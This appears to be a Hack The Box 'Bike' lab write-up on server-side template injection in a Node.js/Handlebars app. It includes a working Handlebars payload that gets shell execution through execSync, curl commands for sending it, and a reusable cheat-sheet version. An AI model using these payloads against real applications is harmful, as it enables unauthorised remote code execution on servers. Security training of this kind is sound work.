# HTB Bike — Full Debrief & Notes
**Difficulty:** Easy (Tier 1 Starting Point)  
**Core Vulnerability:** Server-Side Template Injection (SSTI) → RCE  
**Flag:** `[redacted]`

---

## Kill Chain Overview

```
nmap scan
  → Port 80: Node.js / Express app
    → Single email input field, reflects input back
      → Template expression {{7*7}} triggers Handlebars error
        → Error leaks engine name + file paths
          → Handlebars SSTI payload with global.process.mainModule.require
            → RCE as root
              → find / -name flag.txt → cat /root/flag.txt → [redacted]
```

---

## Step-by-Step Attack Chain

### 1. Recon — nmap
```bash
nmap -sV -sC 10.129.97.64
```
**What we found:**
- Port 22: OpenSSH (noted, not useful without creds)
- Port 80: Node.js / Express HTTP server

**Why it mattered:**  
The `Node.js (Express middleware)` fingerprint was a critical early hint. Express apps commonly use template engines like Handlebars, EJS, or Pug. This primed us to think SSTI before even opening the app.

---

### 2. Web App Enumeration
Curled the root page and found a single HTML form:
```html
<form id="form" method="POST" action="/">
  <input name="email" placeholder="E-mail"></input>
```

**The key observation:**  
The app POSTs to `/` and reflects the input back in the response:
```
We will contact you at: [your input]
```
Any time user input is reflected back, the question to ask is: *is this going through a template engine?*

---

### 3. SSTI Detection — The Probe
```bash
curl -X POST http://10.129.97.64 -d "email={{7*7}}"
```

**What came back:**
```
ReferenceError: ... /root/Backend/node_modules/handlebars/...
```

**Two things this error gave us:**
1. **Template engine confirmed: Handlebars** — the path explicitly names it
2. **Running as root** — `/root/Backend/` reveals the process owner
3. **Full stack trace** — file paths like `/root/Backend/routes/handlers.js` show the app structure

The math `{{7*7}}` didn't evaluate to 49 — instead it caused a parse error. This is because Handlebars doesn't allow arbitrary expressions like math inside `{{ }}`. But the input *was* processed by the template engine — the SSTI is real, just needs correct syntax.

---

### 4. Finding the Right Payload
Handlebars uses a logic-less templating philosophy — you can't write arbitrary JS directly in `{{ }}`. But its `#with` helper can be chained to access JavaScript's prototype chain and ultimately call arbitrary code.

The payload structure:
```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('COMMAND');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

**How it works mechanically:**
- `string.sub` is `String.prototype.sub` — a native JS function
- `.constructor` is `Function` — the JS Function constructor
- We push code into an array, then call `string.sub.apply(0, codelist)` which invokes `Function(code)()`
- This gives us arbitrary JS execution inside the Handlebars sandbox

---

### 5. The `require` Problem — First Error
```
ReferenceError: require is not defined
```

The payload ran, but `require` wasn't in scope inside the sandboxed eval context. Handlebars evaluates code in a restricted environment where Node.js module globals aren't directly available.

**The fix — `global.process.mainModule.require`:**  
In any running Node.js process, `global.process` is always accessible. `process.mainModule` is the entry point module. That module has `.require()` attached to it. So:

```javascript
// Instead of:
require('child_process')

// Use:
global.process.mainModule.require('child_process')
```

This bypasses the sandbox restriction by accessing `require` through the global process object rather than the local scope.

---

### 6. RCE — Command Execution
```bash
curl -X POST http://10.129.97.64 \
  --data-urlencode "email={{#with \"s\" as |string|}}
  ...
  {{this.push \"return global.process.mainModule.require('child_process').execSync('ls -la');\"}}
  ..."
```

**Response contained:**
```
drwxrwxr-x  6 root root  4096 Feb 28  2022 .
-rw-rw-r--  1 root root   657 Feb 28  2022 index.js
drwxr-xr-x 94 root root  4096 Feb 28  2022 node_modules
...
```

We had RCE as root. The app was running as the root user — meaning we had full system access from this single injection.

---

### 7. Finding the Flag
```bash
# Find the flag file anywhere on the filesystem
find / -name flag.txt 2>/dev/null
# → /root/flag.txt

# Read it
cat /root/flag.txt
# → 6b258d726d287462d60c103d0142a81c
```

`2>/dev/null` suppresses permission errors from directories we can't read — keeps the output clean.

---

## Attacker Mindset — Stage by Stage

| Stage | Question to Ask |
|-------|----------------|
| Recon | What tech stack is this? What template engines does it commonly use? |
| Input discovery | Does user input get reflected? Where does it go? |
| SSTI probe | Does a template expression like `{{7*7}}` get evaluated or cause an error? |
| Error analysis | What does the error leak? Engine? Paths? User context? |
| Payload research | What's the correct syntax for THIS engine? |
| Sandbox bypass | What's available globally even in a restricted eval context? |
| Post-RCE | What user am I? Where are interesting files? |

---

## Key Concepts to Remember

### What is SSTI?
Server-Side Template Injection happens when user input is embedded directly into a template string that gets compiled and evaluated by a template engine. Instead of treating input as data, the engine treats it as code.

```
// Vulnerable pattern (conceptual)
const output = template.compile("Hello " + userInput)

// If userInput = "{{7*7}}", the engine evaluates it
```

### SSTI vs XSS
- **XSS** — your input is executed in the *victim's browser* (client-side)
- **SSTI** — your input is executed on the *server* (server-side)
- SSTI is almost always more severe because you get server-side code execution

### Why Error Messages Are Gold
The first "failed" payload `{{7*7}}` was arguably more valuable than a success. It revealed:
- The exact template engine (Handlebars)
- The file system layout (`/root/Backend/`)
- The user context (running as root)
- The internal code structure (`routes/handlers.js`)

**Verbose error messages = attacker's best friend.**

### The `global.process.mainModule.require` Chain
```
global          → always available in Node.js
  .process      → the current Node.js process object
    .mainModule → the entry point module (index.js)
      .require  → the module loader function
        ('child_process') → gives access to shell execution
          .execSync('cmd') → runs a shell command synchronously
```

### Why `--data-urlencode`?
Template payloads contain special characters (`{`, `}`, `#`, `|`, `"`, spaces) that would be interpreted or mangled by the shell or HTTP encoding. `--data-urlencode` tells curl to percent-encode the value properly so it arrives at the server intact.

---

## Cheat Sheet Entries

```bash
# SSTI probe — generic math test
curl -X POST <url> -d "param={{7*7}}"

# Handlebars RCE payload (Node.js)
curl -X POST <url> \
  --data-urlencode "param={{#with \"s\" as |string|}}
  {{#with \"e\"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub \"constructor\")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push \"return global.process.mainModule.require('child_process').execSync('COMMAND');\"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}"

# Find flag anywhere on filesystem
find / -name flag.txt 2>/dev/null
find / -name "*.txt" -path "*/root/*" 2>/dev/null

# Suppress permission errors in find
find / -name flag.txt 2>/dev/null
```

---

## SSTI Engine Reference

| Engine | Language | Detection Payload | Notes |
|--------|----------|-------------------|-------|
| Handlebars | Node.js | `{{7*7}}` → error | Use `#with` chain for RCE |
| Jinja2 | Python | `{{7*7}}` → `49` | Use `__class__.__mro__` chain |
| Twig | PHP | `{{7*7}}` → `49` | Use `_self.env` chain |
| EJS | Node.js | `<%= 7*7 %>` → `49` | Direct JS execution |
| Pug | Node.js | `#{7*7}` → `49` | Use `global.process` |

**Detection order of operations:**
1. Try `{{7*7}}` — if evaluated, likely Jinja2/Twig
2. Try `${7*7}` — if evaluated, likely EJS or similar
3. Look at errors for engine names in stack traces

---

## What To Practice Next

1. **Try a Jinja2 SSTI box** — compare the Python `__mro__` chain vs the Handlebars `#with` chain. Understand *why* they're different.
2. **Manual payload construction** — try building the Handlebars payload from scratch instead of copying it. Understand each `#with` nesting step.
3. **Different commands via RCE** — practice: whoami, id, hostname, cat /etc/passwd, ps aux. Get comfortable with blind vs. output-reflected RCE.
4. **Try submitting payloads via Burp Suite** instead of curl — get comfortable with the Repeater tab for iterating on payloads.

---

## HackTricks References

[HackTricks](https://book.hacktricks.xyz) is your go-to reference during CTFs and real engagements. Bookmark these pages for SSTI work:

| Topic | HackTricks URL |
|-------|---------------|
| SSTI Overview + Detection | https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection |
| Handlebars specifically | https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#handlebars-nodejs |
| RCE via Node.js | https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/nodejs-express |

**How to use HackTricks during a box:**
- Confirmed SSTI → go straight to the SSTI page → find your engine → grab the payload
- Unknown service on a port → search `hacktricks <service name>`
- Stuck on privesc → https://book.hacktricks.xyz/linux-hardening/privilege-escalation

It's not cheating — professionals use references constantly. The skill is knowing *which* page to look at and *why* the payload works, not memorizing syntax.

---

## Research Questions

- What is the Handlebars `#with` helper actually designed to do legitimately?
- Why does Handlebars specifically disallow arbitrary expressions in `{{ }}` compared to Jinja2?
- What is `child_process.execSync` vs `exec` vs `spawn` in Node.js? When would you use each during exploitation?
- What is the difference between reflected SSTI and stored SSTI?
- How would you exploit SSTI if the output wasn't reflected back to you (blind SSTI)?
